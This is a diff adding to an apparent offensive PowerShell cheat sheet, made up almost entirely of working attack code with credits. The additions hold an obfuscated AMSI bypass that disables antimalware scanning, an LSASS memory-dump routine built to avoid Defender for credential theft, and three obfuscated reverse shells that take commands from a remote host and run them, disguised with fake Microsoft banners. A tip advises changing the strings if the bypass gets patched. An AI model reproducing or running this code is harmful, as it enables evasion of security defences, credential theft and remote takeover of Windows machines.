@@ -58,7 +58,22 @@ $assembly = [Ref].Assembly.GetType(('{0}{1}i{2}' -f $a,$b,$u))
 $field = $assembly.GetField(('a{0}iInitFailed' -f $b),'NonPublic,Static')
 $field.SetValue($null,$true)
 ```
-* If patched, just change up the strings/variables.
+Credit: unknown as of yet.
+
+```
+$A="5492868772801748688168747280728187173688878280688776"
+$B="8281173680867656877679866880867644817687416876797271"
+function C($n, $m){
+[string]($n..$m|%{[char][int](29+($A+$B).
+    substring(($_*2),2))})-replace " "}
+$k=C 0 37; $r=C 38 51
+$a=[Ref].Assembly.GetType($k)
+$a.GetField($r,'NonPublic,Static').SetValue($null,$true)
+```
+Credit:
+@TihanyiNorbert (Based on the original work of Matt Graeber @mattifestation script)
+
+**If patched, just change up the strings/variables.**
 
 Single-line bypasses:
 ```
@@ -70,6 +85,86 @@ Credit: https://buaq.net/go-98295.html
 [Ref].Assembly.GetType('System.Management.Automation.'+$("41 6D 73 69 55 74 69 6C 73".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result=$result+$_};$result)).GetField($("61 6D 73 69 49 6E 69 74 46 61 69 6C 65 64".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result2=$result2+$_};$result2),'NonPublic,Static').SetValue($null,$true)
 ```
 Credit: https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification (however, I think it's originally from Matt Graeber)
+
+# LSASS dumping without triggering Defender
+```
+$S = "C:\temp"
+$P = (Get-Process lsass)
+$A = [PSObject].Assembly.GetType('Syst'+'em.Manage'+'ment.Autom'+'ation.Windo'+'wsErrorRe'+'porting')
+$B = $A.GetNestedType('Nativ'+'eMethods', 'Non'+'Public')
+$C = [Reflection.BindingFlags] 'NonPublic, Static'
+$D = $B.GetMethod('MiniDum'+'pWriteDump', $C) 
+$PF = "$($P.Name)_$($P.Id).dmp"
+$PDP = Join-Path $S $PF
+$F = New-Object IO.FileStream($PDP, [IO.FileMode]::Create)
+$R = $D.Invoke($null, @($P.Handle,$G,$F.SafeFileHandle,[UInt32] 2,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero))
+$F.Close()
+```
+Credit:
+@TihanyiNorbert (Full-memory lsass dump based on the original work of Matthew Graeber - @mattifestation)
+
+# Reverse Shells
+
+```
+Set-Alias -Name K -Value Out-String
+Set-Alias -Name nothingHere -Value iex
+$BT = New-Object "S`y`stem.Net.Sockets.T`CPCl`ient"($args[0],$args[1]);
+$replace = $BT.GetStream();
+[byte[]]$B = 0..(32768*2-1)|%{0};
+$B = ([text.encoding]::UTF8).GetBytes("(c) Microsoft Corporation. All rights reserved.`n`n")
+$replace.Write($B,0,$B.Length)
+$B = ([text.encoding]::ASCII).GetBytes((Get-Location).Path + '>')
+$replace.Write($B,0,$B.Length)
+[byte[]]$int = 0..(10000+55535)|%{0};
+while(($i = $replace.Read($int, 0, $int.Length)) -ne 0){;
+$ROM = [text.encoding]::ASCII.GetString($int,0, $i);
+$I = (nothingHere $ROM 2>&1 | K );
+$I2  = $I + (pwd).Path + '> ';
+$U = [text.encoding]::ASCII.GetBytes($I2);
+$replace.Write($U,0,$U.Length);
+$replace.Flush()};
+$BT.Close()
+```
+Credit:
+@TihanyiNorbert (Reverse shell based on the original nishang Framework written by @nikhil_mitt)
+
+```
+$J = New-Object System.Net.Sockets.TCPClient($args[0],$args[1]);
+$SS = $J.GetStream();
+[byte[]]$OO = 0..((2-shl(3*5))-1)|%{0};
+$OO = ([text.encoding]::UTF8).GetBytes("Copyright (C) 2022 Microsoft Corporation. All rights reserved.`n`n")
+$SS.Write($OO,0,$OO.Length)
+$OO = ([text.encoding]::UTF8).GetBytes((Get-Location).Path + '>')
+$SS.Write($OO,0,$OO.Length)
+[byte[]]$OO = 0..((2-shl(3*5))-1)|%{0};
+while(($A = $SS.Read($OO, 0, $OO.Length)) -ne 0){;$DD = (New-Object System.Text.UTF8Encoding).GetString($OO,0, $A);
+$GG = (i`eX $DD 2>&1 | Out-String );
+$H  = $GG + (pwd).Path + '> ';
+$L = ([text.encoding]::UTF8).GetBytes($H);
+$SS.Write($L,0,$L.Length);
+$SS.Flush()};
+$J.Close()
+```
+Credit:
+@TihanyiNorbert (Reverse shell based on the original nishang Framework written by @nikhil_mitt)
+
+```
+$c = New-Object System.Net.Sockets.TCPClient($args[0],$args[1]);
+$I = $c.GetStream();
+[byte[]]$U = 0..(2-shl15)|%{0};
+$U = ([text.encoding]::ASCII).GetBytes("Copyright (C) 2021 Microsoft Corporation. All rights reserved.`n`n")
+$I.Write($U,0,$U.Length)
+$U = ([text.encoding]::ASCII).GetBytes((Get-Location).Path + '>')
+$I.Write($U,0,$U.Length)
+while(($k = $I.Read($U, 0, $U.Length)) -ne 0){;$D = (New-Object System.Text.UTF8Encoding).GetString($U,0, $k);
+$a = (iex $D 2>&1 | Out-String );
+$r  = $a + (pwd).Path + '> ';
+$m = ([text.encoding]::ASCII).GetBytes($r);
+$I.Write($m,0,$m.Length);
+$I.Flush()};
+$c.Close()
+```
+Credit: @TihanyiNorbert (Based on the original nishang Framework written by @nikhil_mitt)
 
 # Misc things:
 
